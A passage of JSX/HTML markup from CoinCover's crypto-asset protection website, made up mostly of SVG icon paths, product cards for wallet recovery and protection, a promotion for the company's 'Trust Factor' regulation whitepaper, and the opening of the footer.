                                          d="M18.4132 10.8589C18.1393 10.8589 17.851 10.7436 17.6492 10.5417C17.4474 10.3399 17.332 10.0516 17.332 9.77771C17.332 9.63355 17.3609 9.48939 17.4185 9.35965C17.4762 9.22991 17.5483 9.11458 17.6492 9.01367C18.0528 8.61003 18.7736 8.61003 19.1773 9.01367C19.3791 9.21549 19.4944 9.48939 19.4944 9.77771C19.4944 10.066 19.3791 10.3399 19.1773 10.5417C18.9754 10.7436 18.7015 10.8589 18.4132 10.8589Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M14.8524 7.73082C14.4343 7.31276 14.4343 6.6208 14.8524 6.20275C15.2849 5.78469 15.9624 5.78469 16.3805 6.20275C16.8129 6.6208 16.7985 7.31276 16.3805 7.73082C16.1642 7.94705 15.8903 8.04796 15.6164 8.04796C15.3425 8.04796 15.0686 7.94705 14.8524 7.73082ZM12.0557 4.91974C11.6377 4.50168 11.6377 3.82414 12.0557 3.39167C12.4738 2.97361 13.1657 2.97361 13.5838 3.39167C14.0019 3.82414 14.0019 4.50168 13.5838 4.91974C13.3676 5.13598 13.0937 5.23689 12.8198 5.23689C12.5459 5.23689 12.272 5.13598 12.0557 4.91974Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M10.0226 2.4386C9.87843 2.4386 9.73427 2.40977 9.60453 2.35211C9.47479 2.29445 9.35946 2.20795 9.25855 2.12146C9.05673 1.91964 8.94141 1.63132 8.94141 1.34301C8.94141 1.05469 9.05673 0.78079 9.25855 0.578969C9.35946 0.492474 9.47479 0.40598 9.60453 0.348317C10.0082 0.189743 10.4839 0.290653 10.7866 0.578969C10.9884 0.78079 11.1038 1.06911 11.1038 1.34301C11.1038 1.63132 10.9884 1.91964 10.7866 2.12146C10.5848 2.32328 10.3109 2.4386 10.0226 2.4386Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M1.589 10.8589C1.3151 10.8589 1.02678 10.7436 0.82496 10.5417C0.623139 10.3399 0.507813 10.0516 0.507813 9.77771C0.507812 9.48939 0.623139 9.20107 0.82496 9.01367C1.2286 8.61003 1.96381 8.61003 2.35303 9.01367C2.55485 9.20107 2.67018 9.48939 2.67018 9.77771C2.67018 10.066 2.55485 10.3399 2.35303 10.5417C2.15121 10.7436 1.87731 10.8589 1.589 10.8589Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M7.97588 9.7765C7.97588 9.17103 8.46601 8.69531 9.05706 8.69531C9.64811 8.69531 10.1382 9.17103 10.1382 9.7765C10.1382 10.3675 9.64811 10.8577 9.05706 10.8577C8.46601 10.8577 7.97588 10.3675 7.97588 9.7765ZM4.24219 9.7765C4.24219 9.17103 4.73232 8.69531 5.32337 8.69531C5.92883 8.69531 6.40456 9.17103 6.40456 9.7765C6.40456 10.3675 5.92883 10.8577 5.32337 10.8577C4.73232 10.8577 4.24219 10.3675 4.24219 9.7765Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M12.7882 10.8589C12.4999 10.8589 12.226 10.7436 12.0242 10.5417C11.8224 10.3399 11.707 10.0516 11.707 9.77771C11.707 9.48939 11.8224 9.20107 12.0242 9.01367C12.4278 8.61003 13.1486 8.61003 13.5523 9.01367C13.7541 9.20107 13.8694 9.48939 13.8694 9.77771C13.8694 10.066 13.7541 10.3399 13.5523 10.5417C13.3504 10.7436 13.0765 10.8589 12.7882 10.8589Z"
                                          fill="#3939EF"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_1981_65839">
                                          <rect
                                            width="18.9856"
                                            height={19}
                                            fill="white"
                                            transform="translate(0.507812 0.273438)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </div>
                                </div>
                                <div className="cards_wrapper desk_hidden">
                                  <div className="card">
                                    <a
                                      className="absolute_position"
                                      href="https://www.coincover.com/consumers/products/recover"
                                    ></a>
                                    <h6>
                                      If the worst happens, we help restore
                                      wallet access, quickly and easily.
                                    </h6>
                                    <div>
                                      <a href="https://www.coincover.com/consumers/products/recover">
                                        <svg
                                          width={28}
                                          height={28}
                                          viewBox="0 0 28 28"
                                          fill="none"
                                          xmlns="http://www.w3.org/2000/svg"
                                        >
                                          <g clipPath="url(#clip0_1981_73044)">
                                            <path
                                              d="M20.7208 20.3793C20.6189 20.4813 20.5068 20.5526 20.3641 20.6138C20.2316 20.6647 20.099 20.6953 19.9563 20.6953C19.6709 20.6953 19.3957 20.5832 19.1918 20.3793C19.0899 20.2774 19.0083 20.1551 18.9574 20.0225C18.9064 19.89 18.8758 19.7575 18.8758 19.6148C18.8758 19.044 19.3855 18.5343 19.9563 18.5343C20.2417 18.5343 20.517 18.6464 20.7208 18.8503C20.9247 19.0542 21.0368 19.3294 21.0368 19.6148C21.0368 19.9002 20.9247 20.1754 20.7208 20.3793Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M19.9453 16.7245C19.354 16.7245 18.8749 16.2454 18.8647 15.644C18.8749 15.0426 19.354 14.5635 19.9453 14.5635C20.5467 14.5533 21.036 15.0426 21.0258 15.644C21.0258 15.9498 20.9034 16.2148 20.7098 16.4085C20.5059 16.6124 20.2409 16.7347 19.9351 16.7347L19.9453 16.7245ZM19.9554 12.7592C19.354 12.749 18.8749 12.2699 18.8647 11.6685C18.8647 11.0773 19.354 10.588 19.9453 10.588C20.5467 10.5982 21.0258 11.0773 21.036 11.6787C21.0258 11.9743 20.9034 12.2394 20.7098 12.433C20.5161 12.6267 20.2511 12.749 19.9554 12.7592Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M20.7091 8.48088C20.5154 8.67456 20.23 8.79688 19.9446 8.79688C19.6592 8.79688 19.3738 8.67456 19.1801 8.48088C19.0782 8.37895 18.9966 8.25663 18.9456 8.12411C18.8947 7.99159 18.8641 7.85908 18.8641 7.71637C18.8641 7.14553 19.3738 6.63586 19.9446 6.63586C20.23 6.63586 20.5053 6.74799 20.7091 6.95186C20.913 7.15573 21.0251 7.43095 21.0251 7.71637C21.0251 8.00179 20.913 8.27701 20.7091 8.48088Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M15.9814 8.78602C15.3902 8.78602 14.9009 8.29673 14.9009 7.70551C14.9111 7.10409 15.3902 6.62499 15.9814 6.625C16.5828 6.6148 17.0619 7.11428 17.0619 7.70551C17.0619 8.01131 16.9396 8.27634 16.7459 8.47002C16.5522 8.66369 16.2872 8.78602 15.9814 8.78602ZM12.0161 8.77582C11.4249 8.77582 10.9458 8.29673 10.9356 7.69531C10.9356 7.10409 11.4249 6.6148 12.0161 6.6148C12.6175 6.625 13.0966 7.10409 13.0966 7.69531C13.0966 8.00112 12.9743 8.26615 12.7806 8.45982C12.587 8.6535 12.3219 8.77582 12.0161 8.77582Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M8.82677 8.4618C8.72483 8.56374 8.60251 8.64529 8.46999 8.69626C8.33748 8.74722 8.19477 8.76761 8.06225 8.7778C7.77684 8.7778 7.49142 8.65548 7.28755 8.45161C7.08368 8.24774 6.97155 7.97252 6.97155 7.6871C6.98174 7.55458 7.00213 7.41187 7.0531 7.27936C7.22639 6.88181 7.63413 6.61678 8.05206 6.60659C8.33748 6.60659 8.6229 6.72891 8.81657 6.92259C9.02044 7.12646 9.14277 7.41187 9.14277 7.69729C9.14277 7.98271 9.03064 8.25793 8.82677 8.4618Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M8.8185 20.3715C8.62482 20.5652 8.33941 20.6875 8.05399 20.6875C7.76857 20.6875 7.48315 20.5652 7.28948 20.3715C7.08561 20.1676 6.96328 19.8822 6.97348 19.607C6.97348 19.0362 7.49335 18.5163 8.05399 18.5265C8.32921 18.5163 8.61463 18.6386 8.8185 18.8425C9.02237 19.0464 9.1345 19.3216 9.1345 19.607C9.1345 19.8924 9.02237 20.1676 8.8185 20.3715Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M12.5687 15.0931C12.1406 14.665 12.1508 13.9821 12.5687 13.5641C12.9866 13.1462 13.6696 13.136 14.0977 13.5641C14.5156 13.9821 14.5156 14.6752 14.0977 15.0931C13.6798 15.5111 12.9866 15.5111 12.5687 15.0931ZM9.92857 17.7333C9.50045 17.3051 9.51064 16.6222 9.92857 16.2042C10.3567 15.7761 11.0295 15.7761 11.4576 16.2042C11.8755 16.6222 11.8857 17.3051 11.4576 17.7333C11.0397 18.1512 10.3465 18.1512 9.92857 17.7333Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M16.7365 12.4574C16.5326 12.6613 16.2574 12.7734 15.972 12.7734C15.6865 12.7734 15.4011 12.6511 15.2074 12.4574C15.0036 12.2536 14.8813 11.9682 14.8914 11.6929C14.8914 11.1221 15.4011 10.6124 15.972 10.6124C16.2472 10.6022 16.5326 10.7245 16.7365 10.9284C16.9403 11.1323 17.0525 11.4075 17.0525 11.6929C17.0525 11.9783 16.9403 12.2536 16.7365 12.4574Z"
                                              fill="#3939EF"
                                            />
                                          </g>
                                          <defs>
                                            <clipPath id="clip0_1981_73044">
                                              <rect
                                                width="18.9856"
                                                height={19}
                                                fill="white"
                                                transform="translate(0.570312 13.6562) rotate(-45)"
                                              />
                                            </clipPath>
                                          </defs>
                                        </svg>
                                      </a>
                                    </div>
                                  </div>
                                  <div className="card">
                                    <a
                                      className="absolute_position"
                                      href="https://www.coincover.com/consumers/products/protect"
                                    ></a>
                                    <h6>
                                      Safeguard your digital assets against
                                      hackers, scammers and targeted attacks.
                                    </h6>
                                    <div>
                                      <a href="https://www.coincover.com/consumers/products/protect">
                                        <svg
                                          width={28}
                                          height={28}
                                          viewBox="0 0 28 28"
                                          fill="none"
                                          xmlns="http://www.w3.org/2000/svg"
                                        >
                                          <g clipPath="url(#clip0_1981_73044)">
                                            <path
                                              d="M20.7208 20.3793C20.6189 20.4813 20.5068 20.5526 20.3641 20.6138C20.2316 20.6647 20.099 20.6953 19.9563 20.6953C19.6709 20.6953 19.3957 20.5832 19.1918 20.3793C19.0899 20.2774 19.0083 20.1551 18.9574 20.0225C18.9064 19.89 18.8758 19.7575 18.8758 19.6148C18.8758 19.044 19.3855 18.5343 19.9563 18.5343C20.2417 18.5343 20.517 18.6464 20.7208 18.8503C20.9247 19.0542 21.0368 19.3294 21.0368 19.6148C21.0368 19.9002 20.9247 20.1754 20.7208 20.3793Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M19.9453 16.7245C19.354 16.7245 18.8749 16.2454 18.8647 15.644C18.8749 15.0426 19.354 14.5635 19.9453 14.5635C20.5467 14.5533 21.036 15.0426 21.0258 15.644C21.0258 15.9498 20.9034 16.2148 20.7098 16.4085C20.5059 16.6124 20.2409 16.7347 19.9351 16.7347L19.9453 16.7245ZM19.9554 12.7592C19.354 12.749 18.8749 12.2699 18.8647 11.6685C18.8647 11.0773 19.354 10.588 19.9453 10.588C20.5467 10.5982 21.0258 11.0773 21.036 11.6787C21.0258 11.9743 20.9034 12.2394 20.7098 12.433C20.5161 12.6267 20.2511 12.749 19.9554 12.7592Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M20.7091 8.48088C20.5154 8.67456 20.23 8.79688 19.9446 8.79688C19.6592 8.79688 19.3738 8.67456 19.1801 8.48088C19.0782 8.37895 18.9966 8.25663 18.9456 8.12411C18.8947 7.99159 18.8641 7.85908 18.8641 7.71637C18.8641 7.14553 19.3738 6.63586 19.9446 6.63586C20.23 6.63586 20.5053 6.74799 20.7091 6.95186C20.913 7.15573 21.0251 7.43095 21.0251 7.71637C21.0251 8.00179 20.913 8.27701 20.7091 8.48088Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M15.9814 8.78602C15.3902 8.78602 14.9009 8.29673 14.9009 7.70551C14.9111 7.10409 15.3902 6.62499 15.9814 6.625C16.5828 6.6148 17.0619 7.11428 17.0619 7.70551C17.0619 8.01131 16.9396 8.27634 16.7459 8.47002C16.5522 8.66369 16.2872 8.78602 15.9814 8.78602ZM12.0161 8.77582C11.4249 8.77582 10.9458 8.29673 10.9356 7.69531C10.9356 7.10409 11.4249 6.6148 12.0161 6.6148C12.6175 6.625 13.0966 7.10409 13.0966 7.69531C13.0966 8.00112 12.9743 8.26615 12.7806 8.45982C12.587 8.6535 12.3219 8.77582 12.0161 8.77582Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M8.82677 8.4618C8.72483 8.56374 8.60251 8.64529 8.46999 8.69626C8.33748 8.74722 8.19477 8.76761 8.06225 8.7778C7.77684 8.7778 7.49142 8.65548 7.28755 8.45161C7.08368 8.24774 6.97155 7.97252 6.97155 7.6871C6.98174 7.55458 7.00213 7.41187 7.0531 7.27936C7.22639 6.88181 7.63413 6.61678 8.05206 6.60659C8.33748 6.60659 8.6229 6.72891 8.81657 6.92259C9.02044 7.12646 9.14277 7.41187 9.14277 7.69729C9.14277 7.98271 9.03064 8.25793 8.82677 8.4618Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M8.8185 20.3715C8.62482 20.5652 8.33941 20.6875 8.05399 20.6875C7.76857 20.6875 7.48315 20.5652 7.28948 20.3715C7.08561 20.1676 6.96328 19.8822 6.97348 19.607C6.97348 19.0362 7.49335 18.5163 8.05399 18.5265C8.32921 18.5163 8.61463 18.6386 8.8185 18.8425C9.02237 19.0464 9.1345 19.3216 9.1345 19.607C9.1345 19.8924 9.02237 20.1676 8.8185 20.3715Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M12.5687 15.0931C12.1406 14.665 12.1508 13.9821 12.5687 13.5641C12.9866 13.1462 13.6696 13.136 14.0977 13.5641C14.5156 13.9821 14.5156 14.6752 14.0977 15.0931C13.6798 15.5111 12.9866 15.5111 12.5687 15.0931ZM9.92857 17.7333C9.50045 17.3051 9.51064 16.6222 9.92857 16.2042C10.3567 15.7761 11.0295 15.7761 11.4576 16.2042C11.8755 16.6222 11.8857 17.3051 11.4576 17.7333C11.0397 18.1512 10.3465 18.1512 9.92857 17.7333Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M16.7365 12.4574C16.5326 12.6613 16.2574 12.7734 15.972 12.7734C15.6865 12.7734 15.4011 12.6511 15.2074 12.4574C15.0036 12.2536 14.8813 11.9682 14.8914 11.6929C14.8914 11.1221 15.4011 10.6124 15.972 10.6124C16.2472 10.6022 16.5326 10.7245 16.7365 10.9284C16.9403 11.1323 17.0525 11.4075 17.0525 11.6929C17.0525 11.9783 16.9403 12.2536 16.7365 12.4574Z"
                                              fill="#3939EF"
                                            />
                                          </g>
                                          <defs>
                                            <clipPath id="clip0_1981_73044">
                                              <rect
                                                width="18.9856"
                                                height={19}
                                                fill="white"
                                                transform="translate(0.570312 13.6562) rotate(-45)"
                                              />
                                            </clipPath>
                                          </defs>
                                        </svg>
                                      </a>
                                    </div>
                                  </div>
                                </div>
                                <div className="custom_arrows arrowsFor_large">
                                  <div className="prev">
                                    <svg
                                      width={20}
                                      height={20}
                                      viewBox="0 0 20 20"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_1981_63494)">
                                        <path
                                          d="M9.99304 0.273922C10.1372 0.273922 10.2669 0.302755 10.4111 0.360418C10.5408 0.418081 10.6562 0.49016 10.7571 0.59107C10.9589 0.792891 11.0742 1.06679 11.0742 1.35511C11.0742 1.49926 11.0454 1.64342 10.9877 1.77316C10.9301 1.90291 10.858 2.01823 10.7571 2.11914C10.3534 2.52279 9.63264 2.52279 9.229 2.11914C9.02718 1.91732 8.91185 1.64342 8.91185 1.35511C8.91185 1.06679 9.02718 0.792891 9.229 0.59107C9.43082 0.389249 9.70472 0.273922 9.99304 0.273922Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M7.95989 3.40199C8.37795 3.82005 8.37795 4.49759 7.95989 4.93007C7.52742 5.34812 6.84988 5.34812 6.43182 4.93007C5.99935 4.51201 5.99935 3.82005 6.43182 3.40199C6.64806 3.18576 6.92196 3.08485 7.19586 3.08485C7.48417 3.08485 7.75807 3.18576 7.97431 3.40199H7.95989ZM5.14882 6.19866C5.56687 6.63113 5.56687 7.30867 5.14882 7.74114C4.73076 8.1592 4.0388 8.1592 3.62074 7.74114C3.20269 7.30867 3.20269 6.63113 3.62074 6.19866C3.83698 5.99684 4.11088 5.89592 4.38478 5.89592C4.65868 5.89592 4.93258 5.99684 5.14882 6.19866Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M1.58679 8.68799C1.86068 8.68799 2.149 8.80331 2.35082 9.00513C2.55264 9.20695 2.66797 9.49527 2.66797 9.76917C2.66797 9.91333 2.63914 10.0575 2.58147 10.1872C2.52381 10.317 2.45173 10.4323 2.35082 10.5332C1.94718 10.9368 1.22639 10.9368 0.822749 10.5332C0.620928 10.3314 0.505601 10.0575 0.505601 9.76917C0.505601 9.48085 0.620928 9.20695 0.822749 9.00513C1.02457 8.80331 1.29847 8.68799 1.58679 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M5.14761 11.8161C5.56567 12.2341 5.56567 12.9261 5.14761 13.3441C4.71513 13.7622 4.03759 13.7622 3.61953 13.3441C3.18706 12.9261 3.20148 12.2341 3.61953 11.8161C3.83577 11.5998 4.10967 11.4989 4.38357 11.4989C4.65747 11.4989 4.93137 11.5998 5.14761 11.8161ZM7.94427 14.6271C8.36233 15.0452 8.36233 15.7227 7.94427 16.1552C7.52621 16.5733 6.83425 16.5733 6.4162 16.1552C5.99814 15.7227 5.99814 15.0452 6.4162 14.6271C6.63243 14.4109 6.90633 14.31 7.18023 14.31C7.45413 14.31 7.72803 14.4109 7.94427 14.6271Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M9.97741 17.1083C10.1216 17.1083 10.2657 17.1371 10.3955 17.1948C10.5252 17.2524 10.6405 17.3389 10.7414 17.4254C10.9433 17.6272 11.0586 17.9156 11.0586 18.2039C11.0586 18.4922 10.9433 18.7661 10.7414 18.9679C10.6405 19.0544 10.5252 19.1409 10.3955 19.1986C9.99183 19.3571 9.5161 19.2562 9.21337 18.9679C9.01155 18.7661 8.89623 18.4778 8.89623 18.2039C8.89623 17.9156 9.01155 17.6272 9.21337 17.4254C9.41519 17.2236 9.68909 17.1083 9.97741 17.1083Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M18.411 8.68799C18.6849 8.68799 18.9732 8.80331 19.175 9.00513C19.3769 9.20695 19.4922 9.49527 19.4922 9.76917C19.4922 10.0575 19.3769 10.3458 19.175 10.5332C18.7714 10.9368 18.0362 10.9368 17.647 10.5332C17.4451 10.3458 17.3298 10.0575 17.3298 9.76917C17.3298 9.48085 17.4451 9.20695 17.647 9.00513C17.8488 8.80331 18.1227 8.68799 18.411 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M12.0241 9.77038C12.0241 10.3758 11.534 10.8516 10.9429 10.8516C10.3519 10.8516 9.86176 10.3758 9.86176 9.77038C9.86176 9.17933 10.3519 8.6892 10.9429 8.6892C11.534 8.6892 12.0241 9.17933 12.0241 9.77038ZM15.7578 9.77038C15.7578 10.3758 15.2677 10.8516 14.6766 10.8516C14.0712 10.8516 13.5954 10.3758 13.5954 9.77038C13.5954 9.17933 14.0712 8.6892 14.6766 8.6892C15.2677 8.6892 15.7578 9.17933 15.7578 9.77038Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M7.21178 8.68799C7.5001 8.68799 7.774 8.80331 7.97582 9.00513C8.17764 9.20695 8.29297 9.49527 8.29297 9.76917C8.29297 10.0575 8.17764 10.3458 7.97582 10.5332C7.57218 10.9368 6.85139 10.9368 6.44775 10.5332C6.24593 10.3458 6.1306 10.0575 6.1306 9.76917C6.1306 9.48085 6.24593 9.20695 6.44775 9.00513C6.64957 8.80331 6.92347 8.68799 7.21178 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_1981_63494">
                                          <rect
                                            width="18.9856"
                                            height={19}
                                            fill="white"
                                            transform="matrix(-1 0 0 -1 19.4922 19.2734)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </div>
                                  <div className="slide-counter secondary-text-size-small">
                                    <span className="current">1</span>/
                                    <span className="total">4</span>
                                  </div>
                                  <div className="next">
                                    <svg
                                      width={20}
                                      height={20}
                                      viewBox="0 0 20 20"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_1981_65839)">
                                        <path
                                          d="M10.007 19.273C9.86281 19.273 9.73307 19.2441 9.58891 19.1865C9.45917 19.1288 9.34384 19.0567 9.24293 18.9558C9.04111 18.754 8.92578 18.4801 8.92578 18.1918C8.92578 18.0476 8.95461 17.9035 9.01228 17.7737C9.06994 17.644 9.14202 17.5286 9.24293 17.4277C9.64657 17.0241 10.3674 17.0241 10.771 17.4277C10.9728 17.6296 11.0881 17.9035 11.0881 18.1918C11.0881 18.4801 10.9728 18.754 10.771 18.9558C10.5692 19.1576 10.2953 19.273 10.007 19.273Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M12.0401 16.1449C11.622 15.7268 11.622 15.0493 12.0401 14.6168C12.4726 14.1988 13.1501 14.1988 13.5682 14.6168C14.0007 15.0349 14.0007 15.7268 13.5682 16.1449C13.3519 16.3611 13.078 16.462 12.8041 16.462C12.5158 16.462 12.2419 16.3611 12.0257 16.1449H12.0401ZM14.8512 13.3482C14.4331 12.9157 14.4331 12.2382 14.8512 11.8057C15.2692 11.3877 15.9612 11.3877 16.3793 11.8057C16.7973 12.2382 16.7973 12.9157 16.3793 13.3482C16.163 13.55 15.8891 13.651 15.6152 13.651C15.3413 13.651 15.0674 13.55 14.8512 13.3482Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M18.4132 10.8589C18.1393 10.8589 17.851 10.7436 17.6492 10.5417C17.4474 10.3399 17.332 10.0516 17.332 9.77771C17.332 9.63355 17.3609 9.48939 17.4185 9.35965C17.4762 9.22991 17.5483 9.11458 17.6492 9.01367C18.0528 8.61003 18.7736 8.61003 19.1773 9.01367C19.3791 9.21549 19.4944 9.48939 19.4944 9.77771C19.4944 10.066 19.3791 10.3399 19.1773 10.5417C18.9754 10.7436 18.7015 10.8589 18.4132 10.8589Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M14.8524 7.73082C14.4343 7.31276 14.4343 6.6208 14.8524 6.20275C15.2849 5.78469 15.9624 5.78469 16.3805 6.20275C16.8129 6.6208 16.7985 7.31276 16.3805 7.73082C16.1642 7.94705 15.8903 8.04796 15.6164 8.04796C15.3425 8.04796 15.0686 7.94705 14.8524 7.73082ZM12.0557 4.91974C11.6377 4.50168 11.6377 3.82414 12.0557 3.39167C12.4738 2.97361 13.1657 2.97361 13.5838 3.39167C14.0019 3.82414 14.0019 4.50168 13.5838 4.91974C13.3676 5.13598 13.0937 5.23689 12.8198 5.23689C12.5459 5.23689 12.272 5.13598 12.0557 4.91974Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M10.0226 2.4386C9.87843 2.4386 9.73427 2.40977 9.60453 2.35211C9.47479 2.29445 9.35946 2.20795 9.25855 2.12146C9.05673 1.91964 8.94141 1.63132 8.94141 1.34301C8.94141 1.05469 9.05673 0.78079 9.25855 0.578969C9.35946 0.492474 9.47479 0.40598 9.60453 0.348317C10.0082 0.189743 10.4839 0.290653 10.7866 0.578969C10.9884 0.78079 11.1038 1.06911 11.1038 1.34301C11.1038 1.63132 10.9884 1.91964 10.7866 2.12146C10.5848 2.32328 10.3109 2.4386 10.0226 2.4386Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M1.589 10.8589C1.3151 10.8589 1.02678 10.7436 0.82496 10.5417C0.623139 10.3399 0.507813 10.0516 0.507813 9.77771C0.507812 9.48939 0.623139 9.20107 0.82496 9.01367C1.2286 8.61003 1.96381 8.61003 2.35303 9.01367C2.55485 9.20107 2.67018 9.48939 2.67018 9.77771C2.67018 10.066 2.55485 10.3399 2.35303 10.5417C2.15121 10.7436 1.87731 10.8589 1.589 10.8589Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M7.97588 9.7765C7.97588 9.17103 8.46601 8.69531 9.05706 8.69531C9.64811 8.69531 10.1382 9.17103 10.1382 9.7765C10.1382 10.3675 9.64811 10.8577 9.05706 10.8577C8.46601 10.8577 7.97588 10.3675 7.97588 9.7765ZM4.24219 9.7765C4.24219 9.17103 4.73232 8.69531 5.32337 8.69531C5.92883 8.69531 6.40456 9.17103 6.40456 9.7765C6.40456 10.3675 5.92883 10.8577 5.32337 10.8577C4.73232 10.8577 4.24219 10.3675 4.24219 9.7765Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M12.7882 10.8589C12.4999 10.8589 12.226 10.7436 12.0242 10.5417C11.8224 10.3399 11.707 10.0516 11.707 9.77771C11.707 9.48939 11.8224 9.20107 12.0242 9.01367C12.4278 8.61003 13.1486 8.61003 13.5523 9.01367C13.7541 9.20107 13.8694 9.48939 13.8694 9.77771C13.8694 10.066 13.7541 10.3399 13.5523 10.5417C13.3504 10.7436 13.0765 10.8589 12.7882 10.8589Z"
                                          fill="#3939EF"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_1981_65839">
                                          <rect
                                            width="18.9856"
                                            height={19}
                                            fill="white"
                                            transform="translate(0.507812 0.273438)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        {/*end widget-span */}
                      </div>
                      {/*end row*/}
                    </div>
                    {/*end row-wrapper */}
                  </div>
                  {/*end widget-span */}
                </div>
                {/*end row*/}
              </div>
              {/*end row-wrapper */}
              <div className="row-fluid-wrapper row-depth-1 row-number-19 dnd_area-row-9-hidden dnd-section dnd_area-row-9-force-full-width-section">
                <div className="row-fluid ">
                  <div
                    className="span12 widget-span widget-type-cell dnd-column"
                    style={{}}
                    data-widget-type="cell"
                    data-x={0}
                    data-w={12}
                  >
                    <div className="row-fluid-wrapper row-depth-1 row-number-20 dnd-row">
                      <div className="row-fluid ">
                        <div
                          className="span12 widget-span widget-type-custom_widget dnd-module"
                          style={{}}
                          data-widget-type="custom_widget"
                          data-x={0}
                          data-w={12}
                        >
                          <div
                            id="hs_cos_wrapper_widget_1750423375206"
                            className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                            style={{}}
                            data-hs-cos-general-type="widget"
                            data-hs-cos-type="module"
                          >
                            <div className="home_bottom_pane_wrapper">
                              <div className="content-wrapper">
                                <div className="heading">
                                  <h3>The Trust Factor</h3>
                                </div>
                                <div className="content">
                                  <h5>
                                    Will regulation take crypto to the next
                                    level?
                                  </h5>
                                  <p>
                                    <span data-teams="true">
                                      Introducing The Trust Factor, a new
                                      whitepaper from CoinCover. We examine how
                                      the next wave of cryptocurrency regulation
                                      could reshape the industry, with findings
                                      from a survey of over 1,000 respondents
                                      and the unique perspectives of 7 of the
                                      industry's leaders.
                                    </span>
                                  </p>
                                </div>
                                <div className="button_wrapper">
                                  <a
                                    className="blue_btn_with_arrow"
                                    href="https://www.coincover.com/knowledge-hub/reports/the-trust-factor"
                                  >
                                    <span>Read the full report</span>
                                  </a>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        {/*end widget-span */}
                      </div>
                      {/*end row*/}
                    </div>
                    {/*end row-wrapper */}
                  </div>
                  {/*end widget-span */}
                </div>
                {/*end row*/}
              </div>
              {/*end row-wrapper */}
            </div>
            {/*end widget-span */}
          </div>
        </div>
      </div>
    </main>
    <div data-global-resource-path="Coincover_April2025_CTA9/templates/partials/footer.html">
      <footer className="footer">
        <div className="footer__container">
          <div className="hs-footer-top-section">
            <div className="footer_logo">
              <div
                id="hs_cos_wrapper_footer_logo"
                className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-logo"
                style={{}}
                data-hs-cos-general-type="widget"
                data-hs-cos-type="module"
              >
                <span
                  id="hs_cos_wrapper_footer_logo_hs_logo_widget"
                  className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_logo"
                  style={{}}
                  data-hs-cos-general-type="widget"
                  data-hs-cos-type="logo"
                >
                  <a
                    href="/"
                    id="hs-link-footer_logo_hs_logo_widget"
                    style={{ borderWidth: 0, border: 0 }}
                  >
                    <img
                      src="https://www.coincover.com/hubfs/raw_assets/public/Coincover_April2025_CTA9/images/footer_white_logo.svg"
                      className="hs-image-widget "
                      height={526}
                      style={{
                        height: "auto",
                        width: 327,
                        borderWidth: 0,
                        border: 0
                      }}
                      width={327}
                      alt="CoinCover"
                      title="CoinCover"
                    />
                  </a>
                </span>
              </div>
            </div>
            <div className="footer_social_group">
              <div
                id="hs_cos_wrapper_module_social_icons"
                className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                style={{}}
                data-hs-cos-general-type="widget"
                data-hs-cos-type="module"
              >
                <div className="hs_footer_socilIcons">
                  <ul>
                    <li>
                      <a
                        href="https://www.linkedin.com/company/coincoverglobal/"
                        target="_blank"
                        rel="noopener"
                      >
                        <span className="social_icon custom_svg_icon">
                          <svg
                            width={28}
                            height={28}
                            viewBox="0 0 28 28"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <path
                              fillRule="evenodd"
                              clipRule="evenodd"
